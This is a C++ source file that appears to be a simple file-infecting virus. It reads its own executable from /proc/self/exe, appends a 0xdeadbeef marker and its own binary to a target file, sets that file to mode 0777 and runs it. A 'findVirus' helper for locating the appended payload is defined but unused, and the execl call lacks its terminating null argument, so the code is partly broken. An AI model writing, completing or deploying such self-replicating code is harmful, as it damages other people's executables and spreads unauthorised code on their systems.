#include <iostream>
#include <fstream>
#include <vector>
#include <cstring>
#include <cstdlib>
#include <sys/stat.h>
#include <unistd.h>

#define sentinel 0xdeadbeef

//function to read file
std::vector<char> fileRead(const std::string &filename){
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file.is_open()){
        exit(1);
    }
    size_t fSize = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<char> buffer(fSize);
    file.read(buffer.data(), fSize);
    return buffer;
}

//function to write to file

void writeToFile(const std::string &filename, const std::vector<char> &data){
    std::ofstream file(filename, std::ios::binary | std::ios::app);
    file.write(data.data(), data.size());
    file.close();
}

//function to find virus code
//using u_int32_t to guarantee 32 bits
std::vector<char> findVirus(const std::vector<char> &virus, u_int32_t pos){
    size_t i = 0;
    while(i < virus.size() - sizeof(pos)){
        u_int32_t j;
        std::memcpy(&j, &virus[i], sizeof(j));
        if(j == pos){
            i = i+sizeof(pos);
            break;
        }
        i = i+1;
    }
    return std::vector<char>(virus.begin()+i, virus.end());
}


int main(int argc, char *argv[]){

    std::string f = argv[1];
    //rp = running program
    std::vector<char> rp = fileRead("/proc/self/exe");
    u_int32_t s = sentinel;
    std::cout << "running program size = " << rp.size();

    writeToFile(f, std::vector<char>(reinterpret_cast<char*>(&s), reinterpret_cast<char*>(&s)+sizeof(s)));
    writeToFile(f, rp);

    chmod(f.c_str(), 0777);

    execl(f.c_str(), f.c_str());
    return 0;


}